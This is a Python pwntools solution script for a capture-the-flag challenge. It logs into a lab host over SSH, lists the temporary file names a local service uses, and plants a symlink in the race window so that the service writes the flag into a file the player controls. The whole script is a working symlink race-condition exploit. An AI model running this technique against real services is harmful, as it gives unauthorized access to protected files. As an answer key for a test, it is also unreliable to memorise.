from pwn import *
import json 


def main():
    args = sys.argv[1:]
    # Load JSON file into dictionary
    data = json.loads(open("metadata.json").read())

    # Connect to SSH server
    s1 = ssh("ctf-player", "ssh_host", password=data["password"])
    r1 = s1.remote('localhost', 5556)
    
    tmp = r1.recvline()
    tmp = r1.recvline()
    hmm = s1(f"touch /home/ctf-player/my_file")
    # Send payload
    
    temp_file_names = []
    for i in range(30):
        r1.sendline(b"temp")
        temp = r1.recvline().decode().strip("\n")
        print(temp)
        temp = temp[temp.find("/home/ctf-player/"):]
        if temp in temp_file_names:
            # means we have wrapped around list of temporary files, we can then
            # try our link attack
            break
        temp_file_names.append(temp)

    print(temp_file_names)
    r1.sendline(b"temp")
    # make a symlink in between when the file was tempified and when it gets opened
    # index 1 here because we wrapped around to 0 at end of for loop
    hmm = s1(f"ln -s /home/ctf-player/my_file {temp_file_names[1]}")

    if (hmm.decode().find("No such file") == -1):
        print(hmm.decode())
    r1.sendline(b"flag")
    r1.sendline(b"exit")

    # Receive all
    response = r1.recvall()

    # Convert response to ASCII
    response = response.decode()

    flag = s1(f"cat /home/ctf-player/my_file").decode()
    flag = flag[:flag.find("-")].strip()
    # Write flag to file
    with open("flag", "w") as w:
        w.write(flag)

if __name__ == "__main__":
    main()